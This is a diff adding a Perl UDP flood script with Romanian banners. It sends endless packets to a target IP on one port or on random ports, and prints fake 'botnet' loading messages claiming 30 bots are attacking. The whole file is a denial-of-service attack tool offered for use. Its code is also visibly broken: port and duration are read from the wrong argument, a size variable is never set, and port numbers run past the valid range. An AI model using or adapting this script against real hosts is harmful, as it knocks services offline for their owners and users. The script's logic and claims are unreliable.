@@ -1,0 +1,112 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+my ($ip,$port,$size,$time);
+if ($ARGC !=1) {
+printf "[0;32m#############################################################################\n";
+printf "[0;32m# Comanda este simpla, doar";  printf "[0;31m perl mamaie IP ";printf "[0;32mqmetre #  #\n";
+printf "[0;32m# Arhiva este simpla, 65500 basic - oc to 995500 - By SiLE Cyber            #\n";
+printf "[0;32m#############################################################################\n";
+
+exit(1);
+}
+$ip=$ARGV[0];
+$port=$ARGV[0];
+$time=$ARGV[0];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+printf "[1;36m[                          Loading BoTNeT                          ]\n";
+sleep 3;
+printf "[1;36m[BOT #1 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #2 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #3 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #4 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #5 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #6 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #7 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #8 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #9 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #10 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #11 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #12 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #13 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #14 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #15 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #16 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #17 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #18 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #19 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #20 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #21 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #22 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #23 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #24 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #25 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #26 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #27 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #28 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #29 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+printf "[1;36m[BOT #30 a plecat la atac!                                                             ]\n";
+sleep 0.25;
+clear;
+
+
+
+printf "[0;31m# Am urcat toti botii pe acel IP # R.I.P #\n";
+
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=int(rand 95500) +1;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
